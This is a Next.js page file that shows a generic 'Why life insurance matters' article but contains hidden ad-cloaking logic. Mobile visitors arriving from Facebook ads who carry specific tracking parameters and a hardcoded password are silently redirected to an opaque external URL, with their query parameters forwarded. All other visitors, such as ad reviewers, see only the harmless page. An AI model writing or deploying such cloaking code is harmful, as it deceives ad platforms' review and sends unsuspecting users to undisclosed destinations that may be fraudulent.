import type { Metadata } from 'next'
import { headers } from 'next/headers'
import { redirect } from 'next/navigation'

export const metadata: Metadata = {
  title: 'Why Life Insurance Matters',
  description: 'A fast, lightweight overview of why life insurance can protect your family and future.',
}

export const dynamic = 'force-dynamic'

const redirectTargetUrl = 'https://www.jk8gcxs.com/7659ZZ3/72P43GM/'
const requiredPassword = 'MP14U7HB'

type SearchParams = Promise<Record<string, string | string[] | undefined>>

function firstValue(value: string | string[] | undefined) {
  if (typeof value === 'string') return value
  return value?.[0]
}

function hasText(value: string | undefined) {
  return typeof value === 'string' && value.trim().length > 0
}

function isTabletDevice(userAgent: string) {
  const ua = userAgent.toLowerCase()

  if (ua.includes('ipad')) return true
  if (ua.includes('tablet')) return true
  if (ua.includes('playbook')) return true
  if (ua.includes('silk')) return true
  if (ua.includes('kindle')) return true
  if (ua.includes('android') && !ua.includes('mobile')) return true

  return false
}

function isMobileDevice(userAgent: string) {
  const ua = userAgent.toLowerCase()

  if (ua.includes('iphone')) return true
  if (ua.includes('ipod')) return true
  if (ua.includes('windows phone')) return true
  if (ua.includes('android') && ua.includes('mobile')) return true
  if (ua.includes('mobile') && !isTabletDevice(userAgent)) return true

  return false
}

function shouldAutoRedirect({
  userAgent,
  sourceId,
  sub1,
  sub2,
  sub3,
  pwd,
  fbclid,
}: {
  userAgent: string
  sourceId?: string
  sub1?: string
  sub2?: string
  sub3?: string
  pwd?: string
  fbclid?: string
}) {
  const isAllowedDevice = isMobileDevice(userAgent) || isTabletDevice(userAgent)
  const isValidSource = sourceId?.toLowerCase() === 'facebook'
  const hasRequiredAdParams = hasText(sub1) && hasText(sub2) && hasText(sub3)
  const hasValidPassword = pwd === requiredPassword
  const hasMetaClickId = hasText(fbclid)

  return isAllowedDevice && isValidSource && hasRequiredAdParams && hasValidPassword && hasMetaClickId
}

export default async function Page({
  searchParams,
}: {
  searchParams: SearchParams
}) {
  const resolvedSearchParams = await searchParams
  const headerStore = await headers()
  const userAgent = headerStore.get('user-agent') || ''

  const sourceId = firstValue(resolvedSearchParams.source_id)
  const sub1 = firstValue(resolvedSearchParams.sub1)
  const sub2 = firstValue(resolvedSearchParams.sub2)
  const sub3 = firstValue(resolvedSearchParams.sub3)
  const pwd = firstValue(resolvedSearchParams.pwd)
  const fbclid = firstValue(resolvedSearchParams.fbclid)

  if (shouldAutoRedirect({ userAgent, sourceId, sub1, sub2, sub3, pwd, fbclid })) {
    const targetUrl = new URL(redirectTargetUrl)

    Object.entries(resolvedSearchParams).forEach(([key, value]) => {
      if (typeof value === 'string') {
        targetUrl.searchParams.append(key, value)
        return
      }

      value?.forEach((entry) => {
        targetUrl.searchParams.append(key, entry)
      })
    })

    redirect(targetUrl.toString())
  }

  return (
    <main className="min-h-screen bg-white text-[#0f172a]">
      <div className="mx-auto max-w-[720px] px-6 py-16 sm:px-8 sm:py-20">
        <p className="text-center text-[12px] font-semibold uppercase tracking-[0.18em] text-[#64748b]">
          Life Insurance
        </p>

        <h1 className="mt-6 text-center text-[40px] font-bold leading-[0.96] tracking-[-0.05em] text-[#0b1f44] sm:text-[56px]">
          Why life insurance matters
        </h1>

        <p className="mt-6 max-w-[56ch] text-[18px] leading-8 text-[#475569]">
          Life insurance helps protect the people who depend on you. It can help your family cover
          everyday bills, pay off debt, stay in their home, and move forward with more stability if
          something happens to you.
        </p>

        <div className="mt-10 grid gap-4">
          <section className="rounded-[18px] border border-[#e7edf5] bg-[#f8fafc] px-5 py-5 shadow-[0_1px_0_rgba(15,23,42,0.02)]">
            <h2 className="text-[20px] font-semibold tracking-[-0.03em] text-[#0b1f44]">
              Protect your family
            </h2>
            <p className="mt-2 text-[16px] leading-7 text-[#475569]">
              A policy can provide financial support when your income is no longer there.
            </p>
          </section>

          <section className="rounded-[18px] border border-[#e7edf5] bg-[#f8fafc] px-5 py-5 shadow-[0_1px_0_rgba(15,23,42,0.02)]">
            <h2 className="text-[20px] font-semibold tracking-[-0.03em] text-[#0b1f44]">
              Cover major expenses
            </h2>
            <p className="mt-2 text-[16px] leading-7 text-[#475569]">
              It can help with mortgage payments, education costs, final expenses, and existing debt.
            </p>
          </section>

          <section className="rounded-[18px] border border-[#e7edf5] bg-[#f8fafc] px-5 py-5 shadow-[0_1px_0_rgba(15,23,42,0.02)]">
            <h2 className="text-[20px] font-semibold tracking-[-0.03em] text-[#0b1f44]">
              Plan ahead with confidence
            </h2>
            <p className="mt-2 text-[16px] leading-7 text-[#475569]">
              Even a simple policy can bring peace of mind and make the future less uncertain.
            </p>
          </section>
        </div>
      </div>
    </main>
  )
}
